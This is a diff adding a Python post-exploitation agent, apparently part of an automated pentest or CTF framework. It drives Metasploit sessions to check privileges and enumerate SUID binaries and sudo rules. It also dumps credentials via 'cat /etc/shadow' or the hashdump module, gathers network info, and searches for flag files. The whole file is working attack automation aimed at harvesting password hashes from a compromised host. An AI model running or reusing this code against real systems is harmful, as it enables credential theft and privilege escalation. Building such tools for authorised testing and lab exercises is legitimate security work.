@@ -1,0 +1,116 @@
+"""
+post_agent.py
+后渗透 Agent —— 权限枚举 / 提权尝试 / 信息收集
+"""
+from __future__ import annotations
+
+import logging
+from typing import Any
+
+from backend.agents.models import ExploitResult
+from backend.tools.msf_client import MsfClient
+
+logger = logging.getLogger(__name__)
+
+
+class PostExploitAgent:
+    def __init__(self):
+        self.msf = MsfClient()
+
+    async def run(
+        self,
+        exploit_results: list[ExploitResult],
+        target_os: str = "unknown",
+    ) -> dict[str, Any]:
+        successful = [r for r in exploit_results if r.success]
+        if not successful:
+            return {"status": "no_shell", "findings": {}}
+
+        session_id = successful[0].session_info.get("session_id")
+        if not session_id:
+            return {"status": "no_session_id", "findings": {}}
+
+        try:
+            # 检查 MSF 是否可用
+            try:
+                from backend.api.main import is_msf_available
+                if not is_msf_available():
+                    logger.warning("[PostAgent] MSF RPC 不可用，跳过后渗透操作")
+                    return {"status": "msf_unavailable", "findings": {}}
+            except Exception:
+                pass
+            await self.msf.connect()
+        except Exception as e:
+            return {"status": f"msf_connect_failed: {e}", "findings": {}}
+
+        findings: dict[str, Any] = {}
+
+        whoami_out = await self.msf.run_session_command(session_id, "whoami")
+        findings["current_user"] = whoami_out.strip()
+        privilege = "root" if any(
+            x in whoami_out.lower() for x in ["root", "system", "administrator"]
+        ) else "user"
+
+        if privilege != "root":
+            if target_os == "linux":
+                priv_result = await self._linux_privesc(session_id)
+            else:
+                priv_result = await self._windows_privesc(session_id)
+            findings["privesc_attempt"] = priv_result
+            if priv_result.get("success"):
+                privilege = "root"
+
+        if target_os == "linux":
+            shadow = await self.msf.run_session_command(session_id, "cat /etc/shadow 2>/dev/null")
+            findings["shadow_file"] = shadow[:500] if shadow else ""
+        else:
+            hashdump = await self._run_post_module(session_id, "post/windows/gather/hashdump")
+            findings["hashdump"] = hashdump
+
+        ifconfig = await self.msf.run_session_command(
+            session_id, "ifconfig 2>/dev/null || ipconfig"
+        )
+        findings["network_info"] = ifconfig[:1000]
+
+        flag_out = await self.msf.run_session_command(
+            session_id,
+            "find / -name 'flag*' -o -name '*.txt' 2>/dev/null | head -20",
+        )
+        findings["flags"] = flag_out[:500]
+
+        return {"status": "completed", "final_privilege": privilege, "findings": findings}
+
+    async def _linux_privesc(self, session_id: str) -> dict:
+        suid_out = await self.msf.run_session_command(
+            session_id, "find / -perm -u=s -type f 2>/dev/null | head -20"
+        )
+        sudo_out = await self.msf.run_session_command(session_id, "sudo -l 2>/dev/null")
+        interesting = ["bash", "vim", "nano", "python", "perl", "find", "nmap", "less", "more"]
+        found_suid = [b for b in interesting if b in suid_out]
+        return {
+            "method": "suid_sudo",
+            "suid_binaries": found_suid,
+            "sudo_rules": sudo_out[:300],
+            "success": len(found_suid) > 0 or "NOPASSWD" in sudo_out,
+        }
+
+    async def _windows_privesc(self, session_id: str) -> dict:
+        output = await self._run_post_module(
+            session_id, "post/multi/recon/local_exploit_suggester"
+        )
+        return {
+            "method": "local_exploit_suggester",
+            "output": output[:500],
+            "success": "exploitable" in output.lower(),
+        }
+
+    async def _run_post_module(self, session_id: str, module_path: str) -> str:
+        try:
+            _, output = await self.msf.execute_module(
+                module_path=module_path,
+                options={"SESSION": session_id},
+                timeout=30,
+            )
+            return output
+        except Exception as e:
+            return f"模块执行失败: {e}"
